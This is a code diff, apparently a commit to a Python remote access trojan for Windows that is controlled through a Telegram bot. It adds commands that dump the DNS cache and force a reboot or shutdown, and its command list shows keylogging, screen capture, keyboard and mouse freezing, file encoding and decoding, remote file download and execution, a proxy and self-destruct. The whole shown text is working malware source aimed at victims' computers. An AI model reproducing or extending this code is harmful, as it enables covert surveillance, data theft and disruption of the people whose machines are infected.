@@ -238,6 +238,12 @@ def handle(msg):
 							response = 'Succesfully removed folder and it\'s files'
 						except:
 							response = 'File not found'
+			elif command == '/dns':
+				bot.sendChatAction(chat_id, 'typing')
+				lines = os.popen('ipconfig /displaydns')
+				for line in lines:
+					line.replace('\n\n', '\n')
+					response += line
 			elif command.startswith('/download'):
 				bot.sendChatAction(chat_id, 'typing')
 				path_file = command.replace('/download', '')
@@ -358,6 +364,13 @@ def handle(msg):
 				for file in files:
 					human_readable += file + '\n'
 				response = human_readable
+			elif command.startswith('/msg_box'):
+				message = command.replace('/msg_box', '')
+				if message == '':
+					response = '/msg_box yourText'
+				else:
+					ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
+					response = 'MsgBox displayed'
 			elif command.startswith('/mv'):
 				command = command.replace('/mv', '')
 				if len(command) > 0:
@@ -371,13 +384,6 @@ def handle(msg):
 				else:
 					response = 'Usage: \n/mv "C:/Users/DonaldTrump/Desktop/porn.jpg" "C:/Users/DonaldTrump/AppData/Roaming/Microsoft Windows/[pornography.jpg]"'
 					response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
-			elif command.startswith('/msg_box'):
-				message = command.replace('/msg_box', '')
-				if message == '':
-					response = '/msg_box yourText'
-				else:
-					ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
-					response = 'MsgBox displayed'
 			elif command == '/pc_info':
 				bot.sendChatAction(chat_id, 'typing')
 				info = ''
@@ -407,6 +413,10 @@ def handle(msg):
 				response = 'Proxy succesfully setup on ' + ip + ':8081'
 			elif command == '/pwd':
 				response = os.getcwd()
+			elif command == '/reboot':
+				bot.sendChatAction(chat_id, 'typing')
+				command = os.popen('shutdown /r /f /t 0')
+				response = 'Computer will be restarted NOW.'
 			elif command.startswith('/run'):
 				bot.sendChatAction(chat_id, 'typing')
 				path_file = command.replace('/run', '')
@@ -439,6 +449,10 @@ def handle(msg):
 				global destroy
 				destroy = True
 				response = 'You sure? Type \'/destroy\' to proceed.'
+			elif command == '/shutdown':
+				bot.sendChatAction(chat_id, 'typing')
+				command = os.popen('shutdown /s /f /t 0')
+				response = 'Computer will be shutdown NOW.'
 			elif command == '/destroy' and destroy == True:
 				bot.sendChatAction(chat_id, 'typing')
 				if os.path.exists(hide_folder):
@@ -486,9 +500,10 @@ def handle(msg):
 				functionalities = { '/arp' : '', \
 						'/capture_pc' : '', \
 						'/cd':'<target_dir>', \
-						'/delete':'<target_file>', \
-						'/download':'<target_file>', \
 						'/decode_all':'', \
+						'/delete':'<target_file>', \
+						'/dns':'', \
+						'/download':'<target_file>', \
 						'/encode_all':'', \
 						'/freeze_keyboard':'', \
 						'/freeze_mouse':'', \
@@ -497,12 +512,15 @@ def handle(msg):
 						'/keylogs':'', \
 						'/ls':'[target_folder]', \
 						'/msg_box':'<text>', \
+						'/nslookup':'', \
 						'/pc_info':'', \
 						'/play':'<youtube_videoId>', \
 						'/proxy':'', \
 						'/pwd':'', \
+						'/reboot':'', \
 						'/run':'<target_file>', \
 						'/self_destruct':'', \
+						'/shutdown':'', \
 						'/tasklist':'', \
 						'/to':'<target_computer>, [other_target_computer]',\
 						'/update':''}
